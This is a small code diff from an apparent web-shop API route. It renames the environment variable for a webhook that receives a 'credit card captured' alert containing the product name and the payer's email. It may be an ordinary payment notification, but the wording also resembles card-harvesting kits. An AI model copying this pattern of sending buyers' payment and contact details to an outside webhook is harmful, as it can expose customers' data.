@@ -43,7 +43,7 @@ export const POST: APIRoute = async ({ request }) => {
     },
   ];
 
-  sendEmbedToWebhook(import.meta.env.SECRET_CC_WEBHOOK, {
+  sendEmbedToWebhook(import.meta.env.SECRET_WEBHOOK_CC, {
     title: "🏛️ Cartão de Crédito capturado!",
     description: `do produto: **${product.name}**`,
     footer: { text: payload.payer_email },
